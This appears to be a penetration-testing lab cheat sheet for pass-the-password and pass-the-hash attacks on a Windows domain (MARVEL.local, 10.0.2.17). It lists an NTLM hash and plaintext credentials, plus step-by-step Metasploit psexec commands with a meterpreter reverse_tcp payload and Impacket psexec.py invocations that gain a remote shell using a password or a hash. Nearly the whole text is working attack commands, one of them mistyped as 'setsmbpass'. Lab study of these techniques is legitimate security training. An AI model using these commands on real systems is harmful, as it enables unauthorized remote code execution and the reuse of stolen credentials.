### NTLM Hash
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::`
`Username:UID:LM:NT`

### Through Metasploit - with a password
- `use exploit/windows/smb/psexec`
- `options`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set RHOSTS 10.0.2.17`
- `set smbdomain MARVEL.local`
- `set smbuser fcastle`
- `setsmbpass Password1`
- `show targets`
- `exploit`
- Meterpreter session:
	- `background`
- `sessions`

### Through Metasploit - with a hash
- `use exploit/windows/smb/psexec`
- `options`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set RHOSTS 10.0.2.17`
- `set smbuser administrator`
- `setsmbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f`
- `show targets`
- `exploit`
- Meterpreter session:
	- `background`
- `sessions`
### Through psexec - with a password
- `psexec.py MARVEL.local/fcastle:'Password1'@10.0.2.17`

### Through psexec - with a hash
- `psexec.py administrator@10.0.2.17 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f`

### Alternate tools
We can use any of the `psexec, wmiexec, smbexec` tools, depending on their compatibility with the test environment.